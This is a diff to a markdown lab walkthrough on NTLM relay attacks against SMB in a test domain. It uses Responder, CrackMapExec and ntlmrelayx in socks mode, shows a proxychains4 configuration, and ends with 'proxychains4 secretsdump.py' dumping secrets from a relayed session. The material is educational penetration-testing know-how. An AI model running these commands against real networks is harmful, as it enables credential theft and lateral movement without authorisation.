@@ -56,7 +56,7 @@ When I logged on the victim pc opened a file browser and tried to connect to `\\
 
 ![responder](images/responder.png)
 
-Please note that even in this configuration, the tool captures guessing material (NetNTLM hash, the result of NTLM challenge-response protocol execution) for eventual later use with an offline guessing attack. This behaviour is particularly useful when an organization has automatic tools called “spyders” scanning the network.
+Please note that even in this configuration, the tool captures guessing material (NetNTLM hash, the result of NTLM challenge-response protocol execution) for possible later use with an offline guessing attack. This behaviour is particularly useful when an organization has automatic tools called “spyders” scanning the network.
 
 In the next step we will use the “CrackMapExec” tool and its module “smb” in order to carry an initial reconnaisance to find servers that do not support SMB signing :
 ```
@@ -92,21 +92,31 @@ Then I opened the GUI of VICTIM, launched the File Browser and just input `\\cas
 What happens under the hood is that the tool “ntlmrelayx.py” tries to authenticate to all the targets in the list targets.txt obtained with “cme”; the connection was relayed successfully to 10.0.0.10 SRV01 but not back to the victim (cannot relay to yourself). Since it happens that the user “victim” is local admin on SRV01, the secrets are automatically dumped.
 
 ### Attack 1B: Proxy Chaining the SMB Connection Using Responder and NTLM Relay
-In order to illustrate this, we can setup ntlmrelayx with socks mode enabled, meaning we will be able to reuse the relayed connection for using additional toos such as smbclient, psexec, secretsdump etc. 
+In order to illustrate this, we can setup ntlmrelayx with [socks mode](https://www.secureauth.com/blog/playing-with-relayed-credentials/) enabled so that the authenticated sessions will be held active to allow their usage later on, for example for additional tools such as smbclient, psexec, secretsdump etc. 
 
-Let's kill our ntlmrelayx session and start it up again but this time with the -socks option:
+Let's kill our ntlmrelayx session and start it up again but this time with the -socks option, making it acts as a socks server that holds all the sessions up even if not used:
 ```
 ntlmrelayx.py -tf /home/jean/Desktop/targets.txt -smb2 -socks
 ```
+Proxychaining is a tool typically used to route network traffic through one or more proxy servers (chains of proxies). In this case we use it simply as a proxy client to be able to use the already opened connection.
+
 To make it work, you also need to modify the following proxychains4 configuration file to change the default port 9050 to 1080 that ntlmrelayx uses:
 ```
 nano /etc/proxychains4.conf 
+```
+So the very end of the file should look like this:
+```
+[ProxyList]
+# add proxy here ...
+socks4 127.0.0.1 1080
 ```
 As you can see, if you input the “socks” command in the ntmlrelayx console, it will present a nice overview of which relays were successful. Please note that those connections will be maintained open “indefinitely”.
 
 ![socks](images/socks.png)
 
-An attacker can then open another terminal to perform further actions on the open connection in a very convenient and efficient way, for example:
+Anytime an attacker wants to use an application or tool and route the connection through the proxy, he would simply prepend the command with "proxychains4".
+
+This way the attacker can perform further actions in the already open connection in a very convenient and efficient way, for example opening another terminal and typing:
 ```
 proxychains4 secretsdump.py ntlmlab/victim@10.0.0.10
 ```
